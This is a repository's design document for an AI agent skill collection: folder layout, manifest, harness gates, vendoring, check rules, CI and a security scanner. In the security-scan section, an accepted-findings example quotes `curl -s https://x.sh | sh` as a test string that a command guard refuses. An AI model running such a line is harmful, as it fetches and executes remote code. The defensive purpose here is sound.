# Skill format

What a skill folder in this collection holds, and the check that keeps the tree sound. Specs and tickets that build skills use this format and do not restate it. Decided in [#42](https://github.com/Hissal/skill-collection/issues/42#issuecomment-6191540887) (disclosure, modes, scripts), [#74](https://github.com/Hissal/skill-collection/issues/74#issuecomment-6442601759) (reachability) and [#18](https://github.com/Hissal/skill-collection/issues/18#issuecomment-6108951944) (layout); specified in [#77](https://github.com/Hissal/skill-collection/issues/77).

- [Skill tree](#skill-tree)
- [Collection manifest](#collection-manifest)
- [Skill folder](#skill-folder)
- [Frontmatter](#frontmatter)
- [Harness gates](#harness-gates)
- [Disclosed references](#disclosed-references)
- [Scripts](#scripts)
- [Portability](#portability)
- [Line endings](#line-endings)
- [Copied skills](#copied-skills)
- [The collection check](#the-collection-check)
- [agnix (on trial)](#agnix-on-trial)
- [Adding a rule](#adding-a-rule)
- [Adding a fixture](#adding-a-fixture)

## Skill tree

One skill tree serves both install routes (folder and plugin):

- core skills: `skills/core/<skill>/`
- pack skills: `skills/packs/<pack>/<skill>/`

Vendor baselines, licences and scripts sit outside the skill tree; the manifest and the always-on source sit at the root.

## Collection manifest

The authored root `collection.json` names membership using repository-relative
skill-folder paths, independent of stable IDs and hard requirements. It is JSON
with exactly these three required fields:

```json
{
  "core": ["skills/core/example"],
  "packs": {
    "onboarding": ["skills/packs/onboarding/automatic-guide"]
  },
  "expensive": ["skills/core/example"]
}
```

- `core`: an array of core skill paths.
- `packs`: an object mapping pack names to arrays of skill paths. A pack is a
  named list; onboarding is a one-skill list containing the automatic guide.
- `expensive`: an array of skill paths whose specs allow the expensive
  description budget. It grants no membership or invocation authority.

Pack names and path segments are lowercase kebab-case (letters and digits).
Paths use forward slashes and exactly `skills/core/<skill>` or
`skills/packs/<pack>/<skill>`, without a trailing slash. Every entry must name
a skill folder in the checked tree, including untracked skills. Empty arrays and
an empty packs object support the tree before skills are authored. Requirements
stay in skill metadata (ADR 0004), never in this manifest.

The `collection-manifest` rule rejects invalid JSON, any other shape, and
entries without a skill. It is silent when the manifest is absent in a fixture
collection. Membership completeness and exclusivity (core or exactly one pack),
onboarding cardinality and plugin-list agreement belong to #110; expensive-list
policy belongs to #111.

Repository areas follow these conventions:

| Area | Contents |
|---|---|
| `skills/core/<skill>/` | Core skills |
| `skills/packs/<pack>/<skill>/` | Pack skills |
| `hooks/` | Hook implementations and adapters |
| `vendor/` | Source baselines, outside the installed skill tree |
| `licenses/` | Source licence texts |
| `scripts/` | Collection tooling |
| Repository root | `collection.json` and the steering source (defined by #118) |

## Skill folder

One folder per skill, with `SKILL.md` at its root. The folder is the installed unit: everything the skill bundles lives inside it. The folder name is the skill's callable name.

## Frontmatter

`SKILL.md` opens with YAML frontmatter:

- `name`: the callable name, matching the folder.
- `description`: for a model-invoked skill, the trigger only: when to load it, never what it does step by step. Quote a description that contains `: ` (`description: "Use when: ..."`). Claude Code tolerates the unquoted form, but strict YAML loaders such as `npx skills` skip the skill without a word.
- `when_to_use` (optional): further trigger text, counted with the description.
- `disable-model-invocation` (optional): `true` makes the skill user-invoked. It is the single source for the gate on every harness; the Codex and OpenCode gates are written from it.
- `metadata` holds the generated OpenCode gate, `opencode/autoinvoke` (see [Harness gates](#harness-gates)), beside any other metadata.

## Harness gates

Whether a skill is model-invoked is decided once, by `disable-model-invocation`, and copied into each harness's own gate. Both gates live in the skill folder, so both install routes carry them:

| Harness | Gate | Model-invoked | User-invoked |
|---|---|---|---|
| Claude Code | `SKILL.md` `disable-model-invocation` (the source) | absent or `false` | `true` |
| Codex | `agents/openai.yaml` `policy.allow_implicit_invocation` | `true` | `false` |
| OpenCode | `SKILL.md` `metadata` `opencode/autoinvoke` | `"true"` | `"false"` |

Codex ignores `disable-model-invocation`, and OpenCode lets `opencode/autoinvoke` override it, so each gate is written out for every skill. The OpenCode value is the quoted string, since collection metadata values are strings. The gates are generated, never hand-edited: change `disable-model-invocation`, then run the writer:

```
node scripts/gates/write-gates.js
```

It writes only those two values, leaving every other line of `SKILL.md` and `agents/openai.yaml` alone, and a second run changes nothing. Run it with `--help` for its `KEY: value` output. The check's `harness-gates` rule fails when a gate is missing, unreadable or disagrees with the source, and names the writer command. Formats and sources: [loading mechanics](../research/loading-mechanics.md) (Codex) and the [OpenCode skill docs](https://github.com/anomalyco/opencode/blob/582c974ee362683f5dd5c7f9741cae207581c6b5/packages/web/src/content/docs/skills.mdx#L34-L96).

## Disclosed references

- What every branch of the skill needs stays in `SKILL.md`. Detail only some branches need goes in a reference file in the skill's own folder.
- Every reference is linked straight from `SKILL.md`, so none is reachable only through another reference.
- Mutually exclusive modes get one reference each, and `SKILL.md` says to read exactly one.
- A reference over 100 lines opens with a contents list: a list of in-page links (`- [Setup](#setup)`), or a list under a `Contents` heading, before its first section.
- Keep the `SKILL.md` body within 500 lines; past that, disclose.
- Name a bundled file with a relative Markdown link from the file that mentions it: `[FORMS.md](FORMS.md)`, `[detect](scripts/detect.js)`. The check also resolves code-span paths starting with `./` or a directory present in the skill folder (such as `references/x.md`). Other code spans may name project files and are left alone.

## Scripts

- A bundled script is a black box: the skill tells the agent to run it with `--help` first, never to read it.
- Detection lives in a script that prints `KEY: value` lines; the prose branches on those keys.
- The skill names any dependency the script needs installed.
- Bundle any script an eval run showed the agent rebuilding each time.

## Portability

A skill's folder works wherever it is installed. It never assumes a sibling folder, a repository checkout or one installation scope (user, project or plugin). Knowledge a skill requires from another skill resolves through that skill's installed identity, not through a path.

## Line endings

The repository is LF everywhere, with no UTF-8 BOM: either breaks frontmatter and shebang detection on some Linux tools. `.gitattributes` makes every text checkout LF, Windows included; the check fails on a CRLF or a BOM in any collection text file.

## Copied skills

A skill copied from a source keeps its provenance in plain files (ADR 0002, [#17](https://github.com/Hissal/skill-collection/issues/17#issuecomment-6108951556), [#51](https://github.com/Hissal/skill-collection/issues/51#issuecomment-6477057987)). An idea taken without copying text needs no record, and no skill carries a `SPEC.md` or `SOURCES.md`.

- **Lock**: `vendor.lock.json` at the root lists every copied skill:

  ```json
  { "skills": [
    { "skill": "skills/core/grilling",
      "source": "mattpocock/skills",
      "path": "skills/grilling",
      "sha": "<full 40-character commit SHA>",
      "license": "MIT",
      "changes": "one line: what this copy changes, or none" } ] }
  ```

  `skill` is the copy's folder in this tree; `source` the GitHub `owner/repo`; `path` the skill folder in the source; `sha` the pinned commit; `license` the source's licence identifier; `changes` the one-line reason for local changes. Every field is required and no other field is allowed. One entry per skill folder.
- **Baseline**: the source folder at the pinned commit, every file, at `vendor/<owner>/<repo>/<skill>/` (`<skill>` is the copy's folder name). The vendor area sits outside every skill root and plugin directory, so no harness loads the baseline's `SKILL.md` and no plugin cache copies it. Everything under `vendor/` belongs to one entry's baseline. Baselines are committed LF and BOM-free like every file (see [Line endings](#line-endings)); the drift script normalises CRLF and BOM itself when it compares with a source.
- **Licence area**: each source's licence in full at `licenses/<owner>/<repo>.txt`.
- **`NOTICE.md`**: each copied skill's folder holds one, generated from the lock and the licence area: the source repository, path, pinned commit, licence, local changes and the full licence text. It travels with plugin and folder installs. Never edit it; after changing the lock or a licence file, regenerate:

  ```
  node scripts/vendor/notice.js
  ```

  `NOTICE.md` is not a reference: it needs no link from `SKILL.md`.

Scripts read the lock through `scripts/vendor/lock.js`, never by parsing it themselves.

**Drift**: `node scripts/vendor/drift.js` classifies every lock entry against its baseline and its source's default branch, one `<skill>: <class>` line each; `--merge <skill>` takes a source update by three-way merge. Run it with `--help` first. Its fixture triples are in `scripts/vendor/test/cases.js`, run by `node scripts/vendor/test/run.js`.

**Runbook**: copying a skill in and taking an update follow [Vendoring and intake runbook](vendoring.md).

## The collection check

```
node scripts/check/check.js
```

It checks the working tree's tracked and untracked, non-ignored files, so a new skill is checked before it is staged. Each finding is one line naming the file and the rule:

```
FAIL skills/core/alpha/SKILL.md:3 [description-colon] description contains an unquoted ": "; ...
WARN skills/core/alpha/REF.md [reference-unlinked] reference is not linked from ...
```

It exits 1 on any `FAIL`; warnings never fail the run. Rules:

| Rule | Level | Finding |
|---|---|---|
| `collection-manifest` | fail | invalid manifest JSON or shape, or an entry naming no skill folder |
| `utf8-bom` | fail | a text file starts with a UTF-8 BOM |
| `crlf-line-ending` | fail | a text file has a CRLF line ending |
| `description-colon` | fail | an unquoted `description` contains `: ` |
| `missing-file` | fail | a Markdown link or clearly bundled code-span path names a missing file inside the skill folder |
| `skill-body-length` | warn | a `SKILL.md` body over 500 lines |
| `reference-contents` | warn | a reference over 100 lines with no contents list |
| `reference-unlinked` | warn | a reference not linked straight from `SKILL.md` (`NOTICE.md` excepted) |
| `skill-metadata` | fail | missing or invalid schema/ID, malformed requirements or duplicate ID |
| `skill-requirements` | fail | a requirement outside the resolved set or a requirement cycle |
| `requirement-reference` | fail | a Markdown link names a missing file in a required skill's folder |
| `guide-needs-target` | fail | a guide needs-table target is not its own file, a skill in the same pack (core for core guides), or explicitly project-selected vendor guidance |
| `guide-routes-paths` | fail | a pack guide shipping `ROUTES.md` declares `paths:` |
| `guard-cases` | fail | a [command guard case](../hooks/command-guard/test/run.js) fails, or the harness exits non-zero; a passing harness prints only its `guard:` summary line |
| `requirement-body-id` | fail | a required ID is absent from the requiring skill's body |
| `vendor-lock` | fail | `vendor.lock.json` is not valid against [Copied skills](#copied-skills), or an entry names no skill folder; the other `vendor-*` rules wait until the lock is valid |
| `vendor-baseline` | fail | a lock entry has no baseline `SKILL.md`, or a file under `vendor/` is in no entry's baseline |
| `vendor-licence` | fail | a lock entry's source has no licence file |
| `vendor-notice` | fail | a copied skill has no `NOTICE.md` or a stale one, or a `NOTICE.md` sits in a skill with no lock entry |
| `dependency-catalog` | fail | the catalog's marked dependency section differs from fresh metadata output; names the regenerate command |
| `harness-gates` | fail | a Codex or OpenCode gate is missing, unreadable or disagrees with `disable-model-invocation` |
| `id-stability` | warn | an ID at the last release tag is gone, or a folder at the tag now carries a different ID |
| `agnix` | warn | an agnix error or warning; agnix missing, not the pinned version, or failing to run (on trial: see [agnix (on trial)](#agnix-on-trial)) |
| `copied-file-safety` | fail | a text file in a lock-listed copied skill contains hidden Unicode controls or a Windows, macOS or Linux personal home path; reports the line and, for Unicode, the code point |
| `automatic-guide-sync` | fail | the automatic guide's `SKILL.md` body, or a bundled file other than the Codex gate file, differs from the core guide's, or one guide bundles a file the other lacks; silent until both guides exist |

Test the check with its fixture runner:

```
node scripts/check/test/run.js
```

and the gate writer with its own (it shares gate parsing with the `harness-gates` rule):

```
node scripts/gates/test/run.js
```

Every change to the check keeps both green: the runner, and the check on the real tree.

Run `npm ci` before the check and its fixtures to install pinned agnix; real-agnix cases then run rather than skip.

## agnix (on trial)

[agnix](https://github.com/agent-sh/agnix) lints harness format mechanics beside the collection's own rules ([#93](https://github.com/Hissal/skill-collection/issues/93)). The check runs the version pinned in `package.json` as its `agnix` rule.

- **Scope and rules off**: [`.agnix.toml`](../.agnix.toml) scopes it to Claude Code and Codex. It turns off `CX-SK-001`, `XP-SK-001`, and for good the wording-opinion rules: every `PE-*`, `AGM-002`, `AGM-004` and `CC-MEM-017`. `CC-MEM-005` to `009` and `CDX-AG-004` are off too: the pinned version has retired them, so they are not listed. Their size replacements, `CC-MEM-014` and `CDX-AG-009`/`010`, stay on.
- **Autofix**: never run. The check passes no fix flag, and its fixture runner fails any case where the check changed a file.
- **Output**: agnix errors and warnings print as `WARN <file>:<line> [agnix] <agnix rule> ...`; its info-level advice is not printed. A missing agnix, a version other than the pin, or a failed run is one warning on `package.json`. Nothing agnix reports fails the run.
- **Trial**: decided in [#77, owner answer 10](https://github.com/Hissal/skill-collection/issues/77#issuecomment-6509966712). The owner judges agnix after its first run over the first real batch of skills, then promotes it to failing (the rule's level becomes `fail`) or drops it (the rule, `.agnix.toml` and the pin go). The collection's own rules stay either way.
- **Decision**: pending. Record the owner's promote-or-drop decision here, with its date and issue link.
- **Bumping the pin**: change `package.json`, run `npm install`, and re-check `.agnix.toml` against agnix's changelog, since releases retire and rename rules.

## Adding a rule

1. Write `scripts/check/rules/<id>.js` exporting `{ id, level, check }`. `level` is `'fail'` or `'warn'`. `check(c)` returns findings `[{ file, line?, message }]`; `file` is repository-relative with `/`, and `message` says what to do.
2. List it in `scripts/check/rules/index.js`. The registry is the only list of rules: `check.js` runs whatever it holds.
3. Add its row to the table above.
4. Add its fixtures (next section).

`c` is the collection view from `scripts/check/collection.js`; read it there rather than re-listing files or re-parsing frontmatter in the rule. It exposes `manifest` (`exists`, parsed `data`, shape/parse `errors`) and carries every checked file (`files`, `bytes`, `text`, `isText`, `exists`), the skills under `skills/` (`dir`, `name`, `skillMd`, `files`, `frontmatter` lines, `body` lines and their line numbers), `references(skill)` and `links(file)`. A rule that needs another shared fact (the manifest, git history) adds it to the view so later rules reuse it.

## Adding a fixture

Add a case to `scripts/check/test/cases.js`; the runner needs no change. A case is a fixture collection tree and every finding the check must print:

```js
{ name: 'a reference not linked from SKILL.md warns',
  files: skill('skills/core/alpha', { body: 'Read [a](A.md).\n', files: { 'A.md': 'See [b](B.md).\n', 'B.md': '# B\n' } }),
  expect: ['warn reference-unlinked skills/core/alpha/B.md'] },
```

- `files` is written untracked into a scratch git repository; `committed` (same shape) is committed first.
- `before` (optional) lists repository scripts run as `node <script> <fixture>` before the check, such as the `NOTICE.md` generator; `clean: true` also requires them to leave every committed file unchanged.
- `history` is a list of earlier commits, `{ files, tag? }`, each a whole tree, optionally tagged. `committed` then replaces the last tree. Use it for rules that read git history.
- `expect` lists each finding as `<fail|warn> <rule> <file>`. A finding not listed fails the case, and the exit code must be 1 exactly when a `fail` is expected. Wording and line numbers are not compared.
- Each fail rule gets a failing fixture and a passing neighbour (`expect: []`); each warning gets a fixture that warns and exits zero.
- `output` (optional) lists regexes the check's other stdout lines must match one to one, in order, for cases about what the check prints besides findings.
- Build skills with `skill()` and `skillMd()`, which produce a skill that passes every rule. A rule that makes a new field required adds that field to `skillMd()` once, so every existing case stays a passing neighbour.
- `skill()` also writes matching harness gates: the OpenCode gate appended to `skillMd()`'s `metadata` (the `gate` option replaces it; `null` leaves it out) and `agents/openai.yaml` (the `openai` option replaces it; `null` leaves it out).
- Write CRLF, BOM and other bytes as escapes in the case (`'\r\n'`, `'\uFEFF'`), so the repository itself stays LF and BOM-free.

## Idle-cost tripwires

Every check run prints estimated tokens (Unicode characters ÷ 4) for core and
each pack present in the collection. Only model-invoked skills contribute their
`description` and optional `when_to_use` values; `disable-model-invocation: true`
excludes a skill. Bodies, reference files and skills outside the collection's
core and pack tree contribute nothing. Quoting and block-scalar markers are
syntax rather than listing text.

`COLLECTION_ALWAYS_ON_PATH` is the single setting for the repository-relative
always-on source path, **set by spec 2, #118/#114**. It is unset by default.
When unset or when the file is absent from the checked collection, the check
prints “not measured” with the reason and continues successfully.

The `idle-cost` warning fires above 500 tokens for the always-on source,
1,000 for core descriptions, or 1,000 for one pack's descriptions. Equality
passes; warnings leave the exit code zero unless another rule fails.
Review growth when a warning appears.

Tripwire fixtures may set `alwaysOnPath` and assert figure text with `output`
(an array of expected stdout substrings); the runner clears an inherited
always-on setting for other fixtures.
## Skill identity and hard requirements

Author identity once, in string-valued `metadata` in `SKILL.md`:

```yaml
metadata:
  agent-skills-sync.schema: "1"
  agent-skills-sync.id: "hissal.skill-collection/example"
  agent-skills-sync.requires: '["hissal.skill-collection/knowledge"]'
```

Schema is the string `"1"`, not the number `1`. IDs use the publisher prefix
`hissal.skill-collection/` and a lowercase kebab-case slug. Each ID is unique
and survives callable renames, folder moves, address and installation scope
changes. Other publishers can adopt the same metadata keys with their own
prefix; this collection currently rejects external IDs and requirements until
an external locator/version contract exists.

`requires` is a JSON array of ID strings inside a YAML string. Omit it, use an
empty string, or use `'[]'` for no requirements. Declare only knowledge the skill
cannot work without. Optional pack lookups, suggestions, related reading and
process calls are not hard requirements and grant no invocation authority.

Requirements resolve by ID against the whole collection tree at the same
revision, across core and pack folders, rather than relative to the caller's
installation scope. Every required ID must resolve; cycles, including self
requirements, fail. A reference in a required skill is named with a relative
Markdown link into that skill's folder, using the existing file-link convention;
the target must exist in the resolved requirement's folder. This applies to links
from both the calling `SKILL.md` and its Markdown references. Code spans and
fenced examples do not declare file links.

Metadata uses an indented YAML string mapping. Plain, single-quoted,
double-quoted and literal/folded block strings are supported; structured YAML
values, aliases and duplicate keys are rejected. Use quoted scalars for values
such as numbers or booleans that YAML would otherwise interpret as non-strings.

## Continuous integration

[Collection check](../.github/workflows/collection-check.yml) runs the fixture runner
and the same collection check command on Windows and Linux: once per push to a
pull request, after each merge to `main`, and by hand on any other branch
(`gh workflow run collection-check.yml --ref <branch>`). Either command failing
fails its job; both platforms run even if one fails. Checkout includes history and tags for checks against the last release.
There is no pre-commit hook.

### Security scan

The workflow's `security-scan` job runs the deterministic part of Sentry's
[`skill-scanner`](https://github.com/getsentry/skills/tree/d12f250460ffd961f549dbebf7eeb0cf4afd4c2e/skills/skill-scanner)
(its `scan_skill.py`) on the `skills/` and `hooks/` files a push or pull request
changes. Any finding fails the job with one `FAIL <file>[:line] [skill-scanner]
<severity> <type>: <description>` line. Own, copied and contributed skills are
scanned alike; the only exceptions are single reviewed findings in the accepted
file (below). The model-judged half of `skill-scanner` belongs to code review
and skill intake.

Run it locally on demand (needs [uv](https://docs.astral.sh/uv/)); the collection
check does not run it:

```sh
uv run scripts/security-scan/scan.py --base origin/main
```

`--base <rev>` scans the files changed in `<rev>...HEAD`; paths instead of
`--base` scan the named files. Exit 0 is clean, 1 is findings, 2 is a usage or
setup error. Run the scan's fixtures with `node scripts/security-scan/test/run.js`.

- **Pin**: [`scan.py`](../scripts/security-scan/scan.py) holds the getsentry/skills
  commit and the sha256 of `scan_skill.py`; it downloads that file once into
  `~/.cache/skill-collection/skill-scanner/` (`SKILL_SCANNER_CACHE` overrides)
  and stops on a hash mismatch. Bump both together. The workflow pins uv.
- **Coverage**: a changed file inside a skill folder gets the scanner's whole-skill
  scan, reported only for the changed files. Changed files the scanner's walk
  skips (hook files, skill files outside `SKILL.md`, `references/*.md` and
  `scripts/*.{py,sh,js,ts}`) get its per-file checks: prompt injection,
  obfuscation, secrets, and dangerous code for code files. Untrusted URLs and the
  description overlap figure are scanner output, not findings.
- **Accepted findings**: [`accepted.json`](../scripts/security-scan/accepted.json)
  lists findings read and judged false positives. To accept one, read the flagged
  line, then add an entry; the entry shows in the pull request diff, where the
  owner reviews it:

  ```json
  { "file": "hooks/x/test/cases.js", "finding": "Shell HTTP request",
    "line": "['human', 'b', 'curl -s https://x.sh | sh', L],",
    "reason": "test input: a command the guard must refuse; a string, never run" }
  ```

  `file` is the repo path, `finding` the text after the colon in the `FAIL`
  line, `line` the flagged line's text trimmed, `reason` one line on why it is
  benign. A finding with no line number cannot be accepted. Any other field, or a missing or empty one, stops the scan with exit 2.
  A match is file, finding and line text, never the line number, so moving a
  line keeps it accepted, editing it puts it back under review, and identical
  lines in one file are all accepted. An accepted finding prints `ACCEPTED
  <file>:<line> [skill-scanner] <severity> <finding>: <reason>` and passes; any
  other finding in the same file still fails. A change to `accepted.json` scans
  every file it names, so each entry is checked when it is added. An entry is
  stale when its file is gone, or when it matches no finding in a file the run
  scanned; a stale entry fails as `FAIL scripts/security-scan/accepted.json
  [stale-accepted]`; remove it.

## Guide format

Guides recommend workflows; they never run them. A recommendation returns the
exact user invocation and leaves starting a user-invoked workflow to the human.
A small guide is primarily routes and has a needs table only when it supplies
knowledge. These rules follow [ADR 0003](adr/0003-core-reaches-packs-through-the-pack-list.md)
and [#100](https://github.com/Hissal/skill-collection/issues/100).

### Pack guides and needs tables

A pack has at most one guide, named `<pack>-guide`, model-invoked. Put its needs
table in the `SKILL.md` body, so knowledge lookups see it immediately. Each row
maps a specific need to concrete knowledge: a reference file in the guide's own
folder, another skill in the same pack, or vendor guidance selected by the
project. A row never ends at generic advice.

Use a two-column Markdown table headed `Need` and `Target` (case-insensitive).
Tables in fenced examples are ignored. The target forms are:

- A relative Markdown link to a file in this guide's folder, including nested
  references; anchors may select a section. Directories do not count.
- `skill: <callable-name>` (optionally in backticks), resolved to a skill in the
  same pack, or core skills when the guide lives in core. This is an installed-skill lookup, not a sibling filesystem path.
- `vendor-guidance: <project-selected guidance>` (optionally in backticks).
  Describe the specific selected source or project pointer. The check recognises
  this marker and does not resolve it: the consuming project's choice is outside
  the collection tree. An arbitrary external URL alone is not this declaration.

Minimal needs table for a hypothetical `web-guide`:

```md
| Need | Target |
|---|---|
| Test idioms for this stack | [Test idioms](references/TESTING.md) |
| Web review checks | `skill: web-review` |
| Framework API contracts | vendor-guidance: framework documentation selected in project instructions |
```

The check recognises guides named `guide` or ending in `-guide`. It fails a
needs-table row whose target does not resolve by the above rules, including a
skill from another pack. General missing-file checks still apply to links.

### Routes

Pack workflow routes live in `ROUTES.md` beside `SKILL.md`. Link it directly
from `SKILL.md` with an instruction to load it **only when routes are requested**;
knowledge lookups must not load routes. A pack with no user-invoked workflows
ships no `ROUTES.md`. A pack guide with routes must never use `paths:`, because
core guide discovery needs it visible in the installed listing.

Every route pairs a distinguishing situation with the exact invocation the
human can type, including arguments when needed. For example:

```md
| Situation | Invocation |
|---|---|
| Review a web change before merging | `/web-review` |
| Diagnose a failing browser test | `/web-debug <failing test>` |
```

The core guide is user-invoked. Its main workflow routes stay in its `SKILL.md`
body; supporting routes live in a directly disclosed reference grouped by need.
The automatic guide uses the same body format; its comparison rule is defined
separately. Route content belongs to the guide's own skill spec.

### Extension points

An extension point is one sentence naming the need and asking the project's
listed pack guides; it never names a particular pack or pack skill. Example:
“Ask the project's listed pack guides for this stack's test idioms and fixtures.”
The caller keeps its current job while obtaining that knowledge; a lookup never
starts another workflow. See [core extension points](agents/core-extension-points.md).

## Hard requirements at runtime

Before doing any work, load every skill declared in `requires` and the
reference files needed from those skills. Resolve them through the installed
skill listing across installation scopes. Begin work only when all required
skills and needed reference files have loaded. If a skill or needed reference
cannot load, stop without partial work and print the stop message below.
A missing reference is a partial install and takes the same stop path.

Runtime checks ask only whether the material loads. Identity and content
verification belong to the installer. Loading a requirement grants no authority
to invoke a user-invoked workflow; starting that workflow still requires the
human's invocation.

### Shared stop template

Copy this block into each requiring skill's body before its work steps.
Replace `<bare-callable-name>` and `<required-id>` for each declared requirement;
use the callable name without a plugin prefix. Repeat the requirement line and
message for each requirement. At runtime, fill `<unloadable-material>` with the
skill or needed reference that failed to load.

```md
Before doing any work, load <bare-callable-name> (<required-id>) and its needed
reference files through the installed skill listing. Begin work only after all
requirements and needed references have loaded. If any cannot load, stop
without partial work and print:

Stopped: required skill <bare-callable-name> (<required-id>) could not be loaded
completely. Unavailable: <unloadable-material>. Ordinary installers such as
`npx skills` do not install requirements; the Unity sync resolves them from
this metadata. Install or repair the requirement, then retry.

Check only whether the required material loads; the installer verifies identity
and content. Loading this requirement grants no permission to invoke a
user-invoked workflow; wait for the human to invoke that workflow.
```

The `requirement-body-id` rule fails when a skill's `SKILL.md` body omits any
ID in its non-empty `requires`. Frontmatter alone does not satisfy it. This is
a presence check, never a wording check; behavioural evals validate the runtime
stop behaviour.

## Generated dependency catalog

After changing skill identity, callable name, folder or hard requirements, run:

```
node scripts/catalog/generate.js
node scripts/check/check.js
```

The writer replaces only the section between `BEGIN GENERATED DEPENDENCIES`
and `END GENERATED DEPENDENCIES` HTML comments in `docs/catalog.md`. On first
use it appends the marked section. Keep pack membership and optional guide
routes outside those markers. Rows and requirements sort by stable ID and use
LF; the table includes skills without requirements. Targets show the current
callable name and source path resolved by ID. Invalid metadata, duplicate IDs
and unresolved requirements stop generation before any write.

The rule checks trees containing `docs/catalog.md`; fixture or subset trees
without that artifact skip it. Malformed or duplicate markers fail. Text outside
the markers remains byte-for-byte unchanged. The fixture runner also exercises
the writer CLI, idempotence, renamed identities and the failure message.
## Skill ID stability

A skill keeps its `agent-skills-sync.id` across renames and moves. The check
compares the working tree with the last release tag: the nearest `v<version>`
tag (release-please's form) reachable from `HEAD`. Before the first release
there is no such tag and the rule is silent; a checkout without tags is silent
too, so CI fetches them.

Deleting or re-identifying a skill on purpose is legitimate: read the warning,
confirm the change is intended, and leave it.

## Copied file safety

Remove hidden controls from copied skill text, including scripts and generated
notices. The check rejects U+00AD, U+034F, U+061C, U+180E, U+200B–U+200F,
U+202A–U+202E, U+2060–U+206F, U+FEFF, U+FFF9–U+FFFB and U+E0000–U+E007F. Ordinary non-ASCII
letters, emoji and variation selectors pass.

Replace personal absolute paths under Windows drive-letter `Users` or
`Documents and Settings`, macOS `/Users/<user>`, Linux `/home/<user>` or
`/root` with portable paths or environment variables. Both Windows slash
forms are checked, including doubled backslashes in string literals.

This rule uses the lock module's copied-folder lookup. It scans non-ignored
text files in those folders, including nested files; baselines and files
outside copied skill folders are outside its scope. Binary files use the
collection's existing NUL-byte exclusion. An invalid lock is reported by
`vendor-lock` before copied-file safety runs.

## Automatic guide

The automatic guide is the core guide (`skills/core/guide/`) published
model-invoked. It is the onboarding pack's one skill
(`skills/packs/onboarding/<name>/`); its callable name is not yet decided, so
the check finds it by that folder. Generate it from the core guide and commit
the output; the generator belongs to spec 12. Edit the core guide, then
regenerate: only frontmatter (the gate and the description) may differ.

The Codex gate file (`agents/openai.yaml`) is generated from frontmatter, so it
differs with the gate and the sync skips it; `harness-gates` checks it against
`disable-model-invocation`. Every other bundled file must match byte for byte.
